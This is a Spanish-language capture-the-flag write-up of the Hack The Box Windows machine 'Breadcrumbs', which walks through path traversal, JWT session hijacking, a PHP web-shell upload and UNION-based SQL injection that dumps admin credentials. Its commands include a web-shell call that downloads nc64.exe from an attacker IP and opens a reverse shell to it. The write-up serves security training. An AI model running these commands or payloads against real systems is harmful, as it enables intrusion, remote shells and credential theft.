---
title: breadcrumbs Writeup
date: 2022-09-26
categories: [Writeup, HTB]
tags: [Windows, LFI, SQL, Burpsuite]
image:
  path: /assets/img/breadcrumbs/Breadcrumbs.png
  width: 800 #normal 800
  height: 500 #normal 500
  alt: breadcrumbs
---

# Maquina breadcrumbs Windows.
Un servicio web al que le haremos fuzzing, rutas con directory listing, con burpsuite ejecutamos un directory trasnversal para buscar un token y una clave secreta que nos permita secuestrar la sesion de un administrador de la web, con un LFI crearemos un .php para ejecutar comandos y lograr entrar en la maquina, un binario que nos da informacion de la existencia de una base de datos que contiene las credenciales 
encriptadas de administrador.

# Reconocimiento.
Con nmap ejecutamos el reconocimiento.

![imagen-de-prueba](/assets/img/breadcrumbs/nmap.png)


Copiamos los puertos abiertos y ejecutamos con nmap 

![imagen-de-prueba](/assets/img/breadcrumbs/nmap2.png)


# Enumeracion

## Puerto 80

mirando un poco la pagina vemos que tenemos una opcion check book

![imagen-de-prueba](/assets/img/breadcrumbs/inicio1.png)


intentando listar algo nos da error, si dejamos en blanco pero con espacios nos lista informacion , pero poco podremos hacer aqui.

![imagen-de-prueba](/assets/img/breadcrumbs/inicio2.png)


Vamos a usar wfuzz para intentar encontrar rutas en esta pagina.

````bash
>wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.228/FUZZ
`````

Al usar wfuzz vemos que tenemos varias rutas con codigo de respuesta `301` ,si entramos a `book` vemos que se lieka informacion, es el contenido que vimos al incio, sigamo buscando en otra ruta `portal`

![imagen-de-prueba](/assets/img/breadcrumbs/fuzz2.png)


![imagen-de-prueba](/assets/img/breadcrumbs/book.png)


Entramos en un login, intentamos entrar co algunas credenciales como `admin:admin user:user user:password` no tenemos acceso, pero nos podemos registrar creare el usario `test:test123`, nos logueamo y tenemos acceso.

![imagen-de-prueba](/assets/img/breadcrumbs/login.png)


![imagen-de-prueba](/assets/img/breadcrumbs/login2.png)


Tenemos varias opciones miremos `check task` , tenemos una tabla llamada `issues` que nos da informacion sobre algunos bugs de la pagina como el de `PHPSESSID ifinite session` 

![imagen-de-prueba](/assets/img/breadcrumbs/login2.png)


![imagen-de-prueba](/assets/img/breadcrumbs/issues.png)


Si miramos las cookies de la pagina vemos el `PHPSESSID` y un  `token`  que es un `JWT` (json web tokens), esta informacion nos puede servir para hacer un `secuestro de sesion (cookie hijacking)`

![imagen-de-prueba](/assets/img/breadcrumbs/tokentest.png)


si miramos en la pagina https://jwt.io y pegamos el token de nuestra sesion , nos da el decoded donde vemos nuestro usuario, podemos cambiar `test` por otro usuario pero nos falta una `clave secreta`, asi que buscaremos mas para intentar encontrar algo relacionado a esta clave.

![imagen-de-prueba](/assets/img/breadcrumbs/jwttest.png)


Regresamo a la pagina y vamos a `user management` y vemos una lista de usuarios con `username, age, position `  hay vario administradores como `paul,jack,alex` , si en la ruta quitamos el users.php nos lieka mas informacion y vemos un archivo `admins.php`, aqui verificamos que usuarios se encuentran activos y `paul` que es administrador lo esta, intentaremos robar su session para ingresar al sistema 

![imagen-de-prueba](/assets/img/breadcrumbs/users1.png)


![imagen-de-prueba](/assets/img/breadcrumbs/active1.png)


Buscando mas a fondo vemos que la opcion `file management`  nos lleva a `/portal/php/file.php` pero nos redirecciona a la pagina de incio.

![imagen-de-prueba](/assets/img/breadcrumbs/redireccion.png)


Voy a usar burpsuite para ver lo que tramita esta pagina cuando damos click en `file management` , activamos el foxyproxy y vamos a interceptar la peticion.

![imagen-de-prueba](/assets/img/breadcrumbs/burp1.png)


Con click derecho en burpsuit voy a `Do intercept -> Response to this request`  para asi tener la respuesta del lado del servidor, luego forward.


Tenemos un codigo de respuesta `302 Found` pero si la cambio  a `200 OK` y luego forward, la pagina me muestra un menu para subir archivos 

![imagen-de-prueba](/assets/img/breadcrumbs/302found.png)


![imagen-de-prueba](/assets/img/breadcrumbs/200ok.png)


Intento subir un cmd.php para intentar ejecutar comandos, pero la pagina me dice que no tengo suficientes privilegios para subirlo.

![imagen-de-prueba](/assets/img/breadcrumbs/upload2.png)


Voy a interceptar otra peticio pero esta vez en la ruta de books , al presionar el boton `Book` nos cargar los archivos .html de la ruta que vimos antes `/books` , veamos que nos reporta el burpsuite.

![imagen-de-prueba](/assets/img/breadcrumbs/books1.png)


Vemos que la peticion no dice que carga los archivos desde el directorio `book` y busca los archivos `.html` , si cambio el nombre del archivo por `test.html` tengo una respuesta donde indica que la hay una sentencia `file_get_contents` para obtener contenido de un archivo en este caso los `.html`

![imagen-de-prueba](/assets/img/breadcrumbs/test4.png)


![imagen-de-prueba](/assets/img/breadcrumbs/test3.png)


Provemos un `Directoy Path Traversal` con la ruta del etc hosts de windows.

![imagen-de-prueba](/assets/img/breadcrumbs/etchost.png)


Funciona, voy a probar otra ruta `/includes/bookController.php` 

![imagen-de-prueba](/assets/img/breadcrumbs/bookcontroller.png)


Vemos que tenemos capacidad de leer los archivos `.php` , busquemos mas rutas que tengan archivos php, profundicemos en las rutas que encontramos antes, apliquemos wfuzz a la ruta `portal` , pero que muestre si hay archivos php

![imagen-de-prueba](/assets/img/breadcrumbs/cookiefuzz.png)


Vemos un archivo `cookie.php` probemos esta ruta en el burpsuite para ver lo que contiene.

![imagen-de-prueba](/assets/img/breadcrumbs/cookieburp.png)


El archivo cookie.php se encarga de crear `PHPSESSID` de nuestra session, toma nuestro username y con key crea un valor aleatorio.

![imagen-de-prueba](/assets/img/breadcrumbs/codigocookie.png)


Probemos el archivo con un print al final del codigo para ver los resultados de la funcion y comprovar si es aleatorio.

![imagen-de-prueba](/assets/img/breadcrumbs/pruebadecookie.png)


Ejecutamos un bucle con el archivo, y vemos que nos crea `PHPSESSID` que tenemos actualemnte en la sesion.

![imagen-de-prueba](/assets/img/breadcrumbs/norandon.png)


En este punto ya tenemos una forma de crear `PHPSESSID` , falta encontrar la calve secreta para crear el JWT.

Seguiremos aplicando wfuzz en la ruta `portal` econtramos otra ruta llamada `includes` vamos a ver si contiene archivos php.

![imagen-de-prueba](/assets/img/breadcrumbs/fuzz3.png)


Probemos con burpsuite para ver el contenido de los .php
miremos el archivo `fileController.php` 

![imagen-de-prueba](/assets/img/breadcrumbs/secreckey.png)


`fileController.php` contiene la clave secreta para el JWT y mas bajo vemos el mensaje de `privilegios insuficientes`, ya con esto podemos crear un JWT y secuetrar la session de `paul` que es un usuario administrador `activo`.


# Cookie Hijacking
Teniendo el token del usuario `test` el cookie.php para generar `PHPSESSID` y la clave secreta, vamos a secuestrar la sesion de `paul` vamos a https://jwt.io 

![imagen-de-prueba](/assets/img/breadcrumbs/token2.png)


![imagen-de-prueba](/assets/img/breadcrumbs/token3.png)


Copiamos el JWT y el `PHPSESSID` en el navegador y recargamos la pagina.

![imagen-de-prueba](/assets/img/breadcrumbs/paul1.png)


![imagen-de-prueba](/assets/img/breadcrumbs/paul2.png)


Ahora estamos como el usuario `paul`, lo primero que voy hacer es intentar subir un archivo que me permita ejecutar comandos, pero antes miremos la peticion con burpsuite.

![imagen-de-prueba](/assets/img/breadcrumbs/paul3.png)


Vemos que al subir el archivo me cambia la extencion `php` a `zip` enviamos la peticion al repeater, cambiamos el archivo a php.

![imagen-de-prueba](/assets/img/breadcrumbs/paul4.png)


Verificamos que si subimos el archivo en al ruta `/portal/uploads` 

![imagen-de-prueba](/assets/img/breadcrumbs/upload.png)


El archivo ya esta en la maquina victima. vamos a probar un comando.

````bash
>http://10.10.10.228/portal/uploads/prueba.php?cmd=ipconfig
`````

![imagen-de-prueba](/assets/img/breadcrumbs/ping.png)


Tenemos ejecucion de comandos.

# Intrucion 
Vamos a subir `nc64.exe` a la maquina victima para establecer una revershell.

````bash
>http://10.10.10.228/portal/uploads/prueba.php?cmd=powershell.exe wget http://10.10.14.7:8000/nc64.exe -O C:\Windows\Temp\nc64.exe
`````
![imagen-de-prueba](/assets/img/breadcrumbs/shell1.png)


Ahora ejecutamos el binario.

````bash
>http://10.10.10.228/portal/uploads/prueba.php?cmd=cmd.exe /c C:\Windows\Temp\nc64.exe -e cmd 10.10.14.7 443
`````
![imagen-de-prueba](/assets/img/breadcrumbs/shell2.png)


Estamos dentro de la maquina con el ususario `www-data` , enumerando el usuario vemos que no tiene privilegios como `SeImpersonatePrivilege` 

![imagen-de-prueba](/assets/img/breadcrumbs/whoami1.png)


Buscando en los directorios encuentro uno llamado `pizzaDeliveryUserData` veamos que contiene.

![imagen-de-prueba](/assets/img/breadcrumbs/pizza.png)


Dentro hay archivos con nombres de usuarios y uno llamado `juliette.json` , si le hago un type al archivo vemos que contiene un username:`juliette` y un password.

![imagen-de-prueba](/assets/img/breadcrumbs/type1.png)


Si miramos de nuevo el scanport del nmap vemos que la maquina tiene el puerto 22 abierto, probemos las credenciales que tenemos de `juliette` con `ssh`

![imagen-de-prueba](/assets/img/breadcrumbs/scan1.png)


Son validas las credenciales para ssh, vamos a enumerar el usuario para ver si tenemos un camino para escalar privilegios.

![imagen-de-prueba](/assets/img/breadcrumbs/ssh1.png)


En la raiz del sistema existe un directorio llamado `Development` pero no tenemos acceso.

![imagen-de-prueba](/assets/img/breadcrumbs/dev1.png)


Me llama mucho la atencion el el directorio asi que buscare una forma de cambiar al usuario `development` , en el Desktop de juliette existe un archivo llamado `todo.html` 

![imagen-de-prueba](/assets/img/breadcrumbs/todo1.png)


Dentro hay un mensaje que dice `Migre las contraseñas de la aplicacion Sticky Notes a nuestro nuevo administrador de contraseñas` 

Con esta informacion buscando en google `sticky note path` o `sticky note backup` , tenemos una ruta donde se almacena un archivo `.sqlite`
`C:\Users\Username\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState`

![imagen-de-prueba](/assets/img/breadcrumbs/sti1.png)


La ruta existe en esta maquina y dentro esta el archivo `.sqlite` .

Voy a descargarlo a mi maquina para analizarlo en local con `smbserver`.

````bash
>smbserver.py smbFolder $(pwd) -smb2support
`````

En local ejecuto un `strings` al archivo y encuentro unas credenciales para el usuario `development` .

![imagen-de-prueba](/assets/img/breadcrumbs/dev2.png)


Compruebo si las credenciales son validas y usare ssh de nuevo.

![imagen-de-prueba](/assets/img/breadcrumbs/dev4.png)


Son validas, como vimos antes teniamos un directorio llamdo `Development` en la raiz del sistema.

![imagen-de-prueba](/assets/img/breadcrumbs/dev5.png)


Dentro del directorio hay un archivo llamado `Krypter_Linux` voy a descargarlo para analizarlo en local nuevamente con smbserver.

![imagen-de-prueba](/assets/img/breadcrumbs/dev6.png)


El archivo esta copilado en linux si lo ejecutamos vemos algo de informcaion.

![imagen-de-prueba](/assets/img/breadcrumbs/dev7.png)


Si ejecuto un  `strings` ecuentro una `url` que apunta aun puerto `1234` que no esta expuesto, pero si miramos dentro de la maquina con `netstat -nat` vemos que si esta.

![imagen-de-prueba](/assets/img/breadcrumbs/url1.png)


![imagen-de-prueba](/assets/img/breadcrumbs/port3.png)


Voy hacer un `local port forwarding` con ssh para analizar la url pero desde mi maquina.

````bash
>ssh Development@10.10.10.228 -L 1234:127.0.0.1:1234
`````

En el navegador vamos al `localhots:1234` y vemos un `Bad Request` , si usamos el method que econtramos nos damos cuenta de que es una base de datos.

![imagen-de-prueba](/assets/img/breadcrumbs/url2.png)


Vemos una `aes_key` una clave encriptada pero no sabemos de que.

![imagen-de-prueba](/assets/img/breadcrumbs/url4.png)


## Inyeccion SQL 

Investigando vi que la base de datos solo tiene una columna.

````bash
>order by 1-- -
`````
![imagen-de-prueba](/assets/img/breadcrumbs/sql1.png)


Veamos el nombre de la base de datos.

````bash
>union select database()-- -
`````

![imagen-de-prueba](/assets/img/breadcrumbs/sql2.png)


Enumeremos las tablas de `bread`.

````bash
>union select table_name from information_schema.tables where table_schema="bread"-- -
`````

![imagen-de-prueba](/assets/img/breadcrumbs/sql3.png)


veamos el contenido de `account y password`.

````bash
>union select group_concat(account,0x3a,password) from bread.passwords-- -
#0x3a son dos puntos (:) en hexadecimal
`````

![imagen-de-prueba](/assets/img/breadcrumbs/sql4.png)


Tenemos las credenciales de `Administrador` pero en `base64`. en la pagina de `cyberchef` vamos a desencriptar las contraseña ya que tenemos la `aes.key` y la clave en `base64`

![imagen-de-prueba](/assets/img/breadcrumbs/base64.png)


Ahora tenemos la contraseña en texto plano, verificamos con crackmapexec o ssh.

![imagen-de-prueba](/assets/img/breadcrumbs/pwned1.png)


Tenemos pwned!!!!
